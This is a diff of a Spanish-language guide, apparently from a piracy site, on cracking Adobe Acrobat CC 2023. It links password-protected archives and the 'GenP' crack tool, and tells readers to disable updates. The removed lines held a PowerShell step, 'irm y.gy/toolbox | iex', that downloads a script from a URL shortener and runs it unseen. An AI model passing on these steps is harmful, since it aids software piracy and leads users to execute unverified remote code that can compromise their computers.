@@ -149,27 +149,17 @@ Para las versiones la contraseña de todos es: `www.artistapirata.com`
 
 1. [Acrobat CC 2023](https://www.mediafire.com/file/tfogsmbw95lf661/WIN_AADC_V2023.003.20244_AP_ZNT.rar/file)
 
-2. Descarga e instala. No ejecutes.
+2. Descarga e instala. Y abre con normalidad.
 
-3. Pega en powershell y da enter en el siguiente script.     
+**Importante:** Descarga ahora el [genP 3.4.4](https://www.mediafire.com/file/bc3ip6pdcux0kg2/Adobe_GenP_v3.4.4_%2528Acrobat_Fix%2529.zip/file)
 
-**Copiame:**
-
-```
-irm y.gy/toolbox | iex
-
-```
-**Imagen de referencia del script**
-![](https://b.thumbs.redditmedia.com/PSAD0TGJyV3t4pihVqMNrtvz6ZAhSvNX75NySZe-AIQ.png)
-
-4. Presiona la opcion 4 y luego la opcion 2.
-
-5. Ve a los ajustes de Acrobat y desactiva las actualizaciones.   
+Ve a los ajustes de Acrobat y desactiva las actualizaciones.   
 Editar > Preferencias > Actualizar
 
 NOTA: Si no te funciona o tienes errores, recomiendo usar la opcion 4 y luego la 1, pero antes usa la herramienta de [limpieza de adobe](https://helpx.adobe.com/es/creative-cloud/kb/cc-cleaner-tool-installation-problems.html)
 
 :::
+
 ::: details 🟪 Audition
 Para las versiones la contraseña de todos es: `www.artistapirata.com`        
 
